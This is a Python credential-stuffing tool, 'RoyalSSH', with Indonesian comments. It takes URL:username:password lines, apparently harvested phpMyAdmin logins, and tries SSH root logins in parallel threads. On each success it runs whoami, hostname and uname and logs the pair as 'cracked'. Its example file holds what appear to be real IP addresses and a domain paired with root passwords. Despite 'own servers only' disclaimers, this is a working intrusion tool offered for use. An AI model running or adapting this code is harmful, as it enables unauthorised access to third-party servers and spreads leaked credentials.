#!/usr/bin/env python3
# -*- coding: utf-8 -*-

################################################################################
#                                                                              #
#                      SSH AUTO LOGIN TOOL - YamiFool                         #
#                            Author: YamiFool - RoyalFool                     #
#                         Contact: @RoyalFool on Telegram                      #
#                      Version: 2.0 - "Royal Edition"                         #
#                                                                              #
#                     "Hanya untuk server milik sendiri!"                     #
#              Penggunaan ilegal diluar tanggung jawab author                 #
#                                                                              #
################################################################################

# Watermark Banner
BANNER = """
\033[1;36m
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗   ██╗ █████╗ ███╗   ███╗██╗███████╗ ██████╗  ██████╗ ██╗     ██╗     
║    ╚██╗ ██╔╝██╔══██╗████╗ ████║██║██╔════╝██╔═══██╗██╔═══██╗██║     ██║     
║     ╚████╔╝ ███████║██╔████╔██║██║█████╗  ██║   ██║██║   ██║██║     ██║     
║      ╚██╔╝  ██╔══██║██║╚██╔╝██║██║██╔══╝  ██║   ██║██║   ██║██║     ██║     
║       ██║   ██║  ██║██║ ╚═╝ ██║██║██║     ╚██████╔╝╚██████╔╝███████╗███████╗
║       ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝      ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
║                                                              ║
║                    🔥 ROYAL EDITION v2.0 🔥                  ║
║                                                              ║
║                  Author: YamiFool - RoyalFool                ║
║                 Telegram: @RoyalFool | @YamiFool            ║
║                    Github: /YamiFool-Royal                  ║
║                                                              ║
║               "For Educational & Own Server Only"            ║
║              Respect Privacy & Use with Permission           ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                     💀 WARNING 💀                            ║
║     Unauthorized access to others servers is ILLEGAL!       ║
║     Author not responsible for misuse of this tool          ║
╚══════════════════════════════════════════════════════════════╝
\033[0m
"""

import re
import sys
import time
import socket
import paramiko
import warnings
import logging
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Nonaktifkan warning
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.disable(logging.CRITICAL)

class RoyalSSH:
    """SSH Auto Login Tool - Created by YamiFool - RoyalFool"""
    
    def __init__(self):
        self.success_log = []
        self.start_time = time.time()
        self.total_attempts = 0
        self.failed_attempts = 0
        self.author = "YamiFool - RoyalFool"
        self.version = "2.0 (Royal Edition)"
        
    def print_banner(self):
        """Tampilkan banner keren"""
        print(BANNER)
        print(f"\033[1;33m[✓] Tool loaded successfully!\033[0m")
        print(f"\033[1;32m[✓] Author: {self.author}\033[0m")
        print(f"\033[1;32m[✓] Version: {self.version}\033[0m")
        print(f"\033[1;32m[✓] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
        print("\033[1;36m" + "="*70 + "\033[0m\n")
        
    def watermark(self):
        """Tambahkan watermark ke setiap output"""
        return f"\033[1;30m[RoyalFool-SSH]\033[0m "
        
    def parse_credentials(self, line):
        """Parse format URL:username:password"""
        try:
            line = line.strip()
            if not line or line.startswith('#'):
                return None
            
            # Handle password yang mengandung karakter :
            parts = line.rsplit(':', 2)
            
            if len(parts) == 3:
                url_part = parts[0]
                username = parts[1]
                password = parts[2]
                
                # Extract domain dari URL
                domain_match = re.search(r'https?://([^/]+)', url_part)
                if domain_match:
                    domain = domain_match.group(1)
                    if ':' in domain:
                        domain = domain.split(':')[0]
                    
                    return {
                        'url': url_part,
                        'host': domain,
                        'port': 22,
                        'username': username,
                        'password': password,
                        'original': line
                    }
        except Exception as e:
            print(f"{self.watermark()}Error parsing: {e}")
        return None
    
    def ssh_login(self, host, port, username, password, timeout=5):
        """Coba login SSH"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        result = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'success': False,
            'banner': None,
            'error': None,
            'timestamp': datetime.now().strftime('%H:%M:%S')
        }
        
        try:
            # Dapatkan banner
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            result['banner'] = banner[:100] if banner else "No banner"
            
            # Coba login
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=timeout
            )
            
            # Test command
            stdin, stdout, stderr = client.exec_command('whoami && hostname', timeout=5)
            output = stdout.read().decode('utf-8').strip().split('\n')
            
            result['success'] = True
            result['whoami'] = output[0] if output else 'unknown'
            result['hostname'] = output[1] if len(output) > 1 else host
            
            # Dapatkan system info
            stdin, stdout, stderr = client.exec_command('uname -a', timeout=5)
            result['system'] = stdout.read().decode('utf-8').strip()[:100]
            
        except paramiko.AuthenticationException:
            result['error'] = 'Auth Failed'
            self.failed_attempts += 1
        except socket.timeout:
            result['error'] = 'Timeout'
            self.failed_attempts += 1
        except socket.error as e:
            result['error'] = f'Socket: {str(e)[:30]}'
            self.failed_attempts += 1
        except Exception as e:
            result['error'] = str(e)[:30]
            self.failed_attempts += 1
        finally:
            client.close()
            self.total_attempts += 1
            
        return result
    
    def process_target(self, target_data):
        """Proses satu target"""
        if not target_data:
            return None
            
        host = target_data['host']
        username = target_data['username']
        password = target_data['password']
        
        print(f"\n{self.watermark()}\033[1;36m{'─'*60}\033[0m")
        print(f"{self.watermark()}\033[1;33m[▶] Target:\033[0m {host}")
        print(f"{self.watermark()}\033[1;33m[▶] User:\033[0m {username}")
        print(f"{self.watermark()}\033[1;33m[▶] Pass:\033[0m {password[:3]}***{password[-3:] if len(password)>6 else ''}")
        print(f"{self.watermark()}\033[1;33m[▶] From:\033[0m {target_data['url']}")
        
        result = self.ssh_login(host, 22, username, password)
        
        if result['success']:
            print(f"{self.watermark()}\033[1;32m[✅] ROYAL SUCCESS!\033[0m")
            print(f"{self.watermark()}    ├─ Hostname: {result.get('hostname', 'N/A')}")
            print(f"{self.watermark()}    ├─ User: {result.get('whoami', 'N/A')}")
            print(f"{self.watermark()}    ├─ System: {result.get('system', 'N/A')[:50]}")
            print(f"{self.watermark()}    └─ Banner: {result.get('banner', 'N/A')}")
            
            # Tambahkan watermark Royal ke hasil
            result['cracked_by'] = self.author
            result['tool'] = f"RoyalSSH v{self.version}"
            self.success_log.append(result)
            
            # Save realtime
            self.save_success_realtime(result)
        else:
            print(f"{self.watermark()}\033[1;31m[❌] FAILED: {result['error']}\033[0m")
        
        return result
    
    def process_file(self, filename, max_workers=5):
        """Proses file credentials"""
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
        except FileNotFoundError:
            print(f"{self.watermark()}\033[1;31mError: File {filename} tidak ditemukan!\033[0m")
            return
        
        print(f"{self.watermark()}\033[1;36m[📁] File: {filename}\033[0m")
        print(f"{self.watermark()}\033[1;36m[🔧] Threads: {max_workers}\033[0m")
        print(f"{self.watermark()}\033[1;36m[📊] Targets: {len(lines)} lines\033[0m")
        print(f"{self.watermark()}\033[1;36m[👑] Author: {self.author}\033[0m")
        print(f"{self.watermark()}\033[1;36m{'─'*60}\033[0m\n")
        
        targets = []
        for line in lines:
            cred = self.parse_credentials(line)
            if cred:
                targets.append(cred)
        
        print(f"{self.watermark()}Valid targets: {len(targets)}/{len(lines)}")
        print()
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.process_target, target) for target in targets]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{self.watermark()}Thread error: {e}")
        
        self.print_summary()
    
    def save_success_realtime(self, result):
        """Simpan hasil realtime ke file"""
        with open('royal_success.txt', 'a') as f:
            f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(f"Host: {result['host']}:{result['port']}\n")
            f.write(f"Login: {result['username']}:{result['password']}\n")
            f.write(f"Hostname: {result.get('hostname', 'N/A')}\n")
            f.write(f"Cracked by: {self.author}\n")
            f.write(f"{'─'*40}\n")
    
    def print_summary(self):
        """Tampilkan ringkasan dengan watermark"""
        elapsed = time.time() - self.start_time
        
        print(f"\n{self.watermark()}\033[1;36m{'═'*60}\033[0m")
        print(f"{self.watermark()}\033[1;33m📊 ROYAL SUMMARY REPORT\033[0m")
        print(f"{self.watermark()}\033[1;36m{'─'*60}\033[0m")
        print(f"{self.watermark()}Total Attempts : {self.total_attempts}")
        print(f"{self.watermark()}Successful    : \033[1;32m{len(self.success_log)}\033[0m")
        print(f"{self.watermark()}Failed        : \033[1;31m{self.failed_attempts}\033[0m")
        print(f"{self.watermark()}Time Elapsed  : {elapsed:.2f} seconds")
        print(f"{self.watermark()}Success Rate  : {(len(self.success_log)/self.total_attempts*100 if self.total_attempts>0 else 0):.1f}%")
        print(f"{self.watermark()}\033[1;36m{'─'*60}\033[0m")
        
        if self.success_log:
            print(f"\n{self.watermark()}\033[1;32m✅ SUCCESSFUL LOGINS:\033[0m")
            for i, s in enumerate(self.success_log, 1):
                print(f"{self.watermark()}  {i}. \033[1;32m{s['host']}:{s['port']} | {s['username']}:{s['password']}\033[0m")
                print(f"{self.watermark()}     └─ Hostname: {s.get('hostname', 'N/A')}")
        
        print(f"\n{self.watermark()}\033[1;36m{'═'*60}\033[0m")
        print(f"{self.watermark()}\033[1;33m👑 RoyalSSH v{self.version} by {self.author}\033[0m")
        print(f"{self.watermark()}\033[1;33m📁 Results saved to: royal_success.txt\033[0m")
        print(f"{self.watermark()}\033[1;36m{'═'*60}\033[0m\n")

def create_example():
    """Buat file contoh"""
    example = """# RoyalSSH Credentials File
# Format: URL:username:password
# Created by YamiFool - RoyalFool

# Contoh dengan IP
http://68.183.108.227/phpmyadmin/:root:T`tcW_;7P}58Aasd

# Contoh dengan domain
https://phpmyadmin.lolouch.com/:root:a0951012413

# Contoh dengan path panjang
http://139.59.8.15/phpmyadmin/index.php:root:sj^+[6=e5pF(X.rZ

# Contoh lainnya
http://165.227.64.72/phpmyadmin/:root:R}KU#qv_Up
"""
    
    with open('royal_credentials.txt', 'w') as f:
        f.write(example)
    print(f"{BANNER}")
    print("\033[1;32m[✓] File contoh dibuat: royal_credentials.txt\033[0m")
    print("\033[1;33m[!] Edit file dengan credentials kamu sendiri!\033[0m")

def main():
    """Main function with Royal watermark"""
    royal = RoyalSSH()
    royal.print_banner()
    
    if len(sys.argv) < 2:
        print(f"\033[1;33m{royal.watermark()}Penggunaan:\033[0m")
        print(f"{royal.watermark()}  python3 royal_ssh.py credentials.txt")
        print(f"{royal.watermark()}  python3 royal_ssh.py credentials.txt --threads 10")
        print(f"{royal.watermark()}  python3 royal_ssh.py --example")
        print()
        print(f"{royal.watermark()}Contoh format credentials.txt:")
        print(f"{royal.watermark()}  http://IP:username:password")
        print(f"{royal.watermark()}  https://domain.com/:user:pass")
        sys.exit(1)
    
    if sys.argv[1] == '--example':
        create_example()
        return
    
    filename = sys.argv[1]
    max_workers = 5
    
    if len(sys.argv) > 3 and sys.argv[2] == '--threads':
        try:
            max_workers = int(sys.argv[3])
        except:
            pass
    
    print(f"{royal.watermark()}🚀 Starting RoyalSSH Engine...")
    time.sleep(1)
    
    royal.process_file(filename, max_workers)
    
    print(f"{royal.watermark()}👑 Thank you for using RoyalSSH by {royal.author}")
    print(f"{royal.watermark()}🔒 Remember: Use only on your own servers!\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n\033[1;33m[!] RoyalSSH interrupted by user\033[0m")
        print(f"\033[1;33m[!] Stay royal! - YamiFool - RoyalFool\033[0m\n")
        sys.exit(0)
    except Exception as e:
        print(f"\033[1;31m[!] Royal Error: {e}\033[0m")
        sys.exit(1)
